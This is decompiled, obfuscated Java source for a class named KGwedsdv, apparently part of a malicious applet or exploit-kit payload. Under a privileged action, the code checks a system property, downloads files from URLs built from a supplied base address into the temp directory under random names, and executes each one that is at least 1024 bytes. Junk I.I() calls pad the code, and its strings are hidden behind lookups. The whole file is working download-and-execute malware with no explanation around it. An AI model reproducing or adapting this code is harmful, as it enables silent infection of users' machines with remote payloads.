// 
// Decompiled by Procyon v0.5.30
// 

package ghsdr;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import I.I;
import java.security.PrivilegedExceptionAction;

public class KGwedsdv implements PrivilegedExceptionAction
{
    public static String append;
    public static String charAt;
    
    public static final byte[] I(final String s) {
        I.I(3004);
        I.I(3013);
        I.I(3018);
        I.I(3027);
        I.I(3034);
        I.I(3040);
        final int n = 2;
        I.I(3045);
        I.I(3053);
        I.I(3060);
        final int n2 = 16;
        I.I(3068);
        I.I(3075);
        I.I(3080);
        I.I(3087);
        I.I(3093);
        I.I(3098);
        final byte[] array = new byte[s.length() / n];
        I.I(3106);
        I.I(3114);
        I.I(3119);
        for (int i = 0; i < s.length(); i += n) {
            I.I(3127);
            I.I(3133);
            I.I(3140);
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
            I.I(3145);
            I.I(3151);
            I.I(3158);
        }
        I.I(3166);
        I.I(3173);
        I.I(3179);
        I.I(3187);
        I.I(3195);
        I.I(3200);
        return array;
    }
    
    @Override
    public final Object run() {
        I.I(1);
        I.I(7);
        I.I(12);
        I.I(21);
        I.I(30);
        I.I(36);
        if (KGwedsdv.append == null) {
            return null;
        }
        I.I(42);
        I.I(49);
        I.I(56);
        I.I(63);
        I.I(71);
        I.I(76);
        try {
            I.I(83);
            I.I(92);
            I.I(100);
            I.I(109);
            I.I(115);
            I.I(121);
            final String property = System.getProperty(I.I(126).replace(I.I(139), ""));
            I.I(141);
            I.I(149);
            I.I(155);
            I.I(160);
            I.I(168);
            I.I(176);
            if (property.indexOf(I.I(185).replace(I.I(206), "")) >= 0) {
                I.I(208);
                I.I(214);
                I.I(219);
                I.I(224);
                I.I(231);
                I.I(238);
                int int1 = 1;
                I.I(243);
                I.I(251);
                I.I(257);
                I.I(266);
                I.I(273);
                I.I(280);
                if (KGwedsdv.charAt != null) {
                    I.I(285);
                    I.I(294);
                    I.I(300);
                    int1 = Integer.parseInt(KGwedsdv.charAt);
                    I.I(305);
                    I.I(314);
                    I.I(323);
                }
                I.I(332);
                I.I(339);
                I.I(344);
                I.I(351);
                I.I(356);
                I.I(361);
                final Runtime runtime = Runtime.getRuntime();
                I.I(368);
                I.I(374);
                I.I(382);
                I.I(388);
                I.I(393);
                I.I(398);
                final int n = 1024;
                I.I(407);
                I.I(414);
                I.I(419);
                I.I(428);
                I.I(437);
                I.I(444);
                for (int i = 0; i < int1; ++i) {
                    I.I(452);
                    I.I(461);
                    I.I(467);
                    I.I(473);
                    I.I(480);
                    I.I(485);
                    final URL url = new URL(KGwedsdv.append + Integer.toString(i));
                    I.I(493);
                    I.I(501);
                    I.I(507);
                    url.openConnection();
                    I.I(514);
                    I.I(521);
                    I.I(528);
                    final InputStream openStream = url.openStream();
                    I.I(533);
                    I.I(539);
                    I.I(547);
                    I.I(554);
                    I.I(562);
                    I.I(568);
                    final String property2 = System.getProperty(I.I(574).replace(I.I(606), ""));
                    I.I(608);
                    I.I(616);
                    I.I(625);
                    I.I(634);
                    I.I(640);
                    I.I(649);
                    final String string = property2 + File.separator;
                    I.I(655);
                    I.I(664);
                    I.I(670);
                    final String string2 = string + Math.random();
                    I.I(677);
                    I.I(685);
                    I.I(691);
                    final String string3 = string2 + I.I(696).replace(I.I(702), "");
                    I.I(704);
                    I.I(711);
                    I.I(716);
                    I.I(723);
                    I.I(729);
                    I.I(736);
                    final FileOutputStream fileOutputStream = new FileOutputStream(string3);
                    I.I(744);
                    I.I(750);
                    I.I(758);
                    I.I(766);
                    I.I(772);
                    I.I(779);
                    I.I(784);
                    I.I(791);
                    I.I(799);
                    I.I(805);
                    I.I(813);
                    I.I(819);
                    I.I(828);
                    I.I(837);
                    I.I(846);
                    int n2 = 0;
                    int read;
                    while ((read = openStream.read()) != -1) {
                        I.I(854);
                        I.I(860);
                        I.I(869);
                        fileOutputStream.write(read);
                        I.I(878);
                        I.I(886);
                        I.I(895);
                        ++n2;
                    }
                    I.I(904);
                    I.I(912);
                    I.I(921);
                    I.I(927);
                    I.I(933);
                    I.I(939);
                    openStream.close();
                    I.I(948);
                    I.I(955);
                    I.I(960);
                    fileOutputStream.close();
                    I.I(967);
                    I.I(975);
                    I.I(984);
                    I.I(990);
                    I.I(997);
                    I.I(1005);
                    if (n2 >= n) {
                        I.I(1014);
                        I.I(1023);
                        I.I(1032);
                        runtime.exec(string3);
                        I.I(1041);
                        I.I(1050);
                        I.I(1055);
                    }
                    I.I(1063);
                    I.I(1072);
                    I.I(1080);
                }
                I.I(1089);
                I.I(1094);
                I.I(1100);
            }
            I.I(1109);
            I.I(1115);
            I.I(1121);
            I.I(1129);
            I.I(1134);
            I.I(1140);
        }
        catch (Exception ex) {
            I.I(1146);
            I.I(1155);
            I.I(1163);
            I.I(1171);
            I.I(1180);
            I.I(1185);
            I.I(1192);
            I.I(1201);
            I.I(1208);
        }
        I.I(1213);
        I.I(1220);
        I.I(1226);
        return null;
    }
    
    public KGwedsdv() {
        I.I(1231);
        I.I(1239);
        I.I(1246);
        I.I(1255);
        I.I(1264);
        I.I(1272);
        try {
            I.I(1279);
            I.I(1285);
            I.I(1294);
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
            I.I(1303);
            I.I(1311);
            I.I(1318);
        }
        catch (Exception ex) {
            I.I(1323);
            I.I(1331);
            I.I(1338);
            I.I(1346);
            I.I(1352);
            I.I(1359);
        }
        I.I(1364);
        I.I(1373);
        I.I(1380);
    }
    
    static {
        KGwedsdv.append = null;
        KGwedsdv.charAt = null;
    }
}
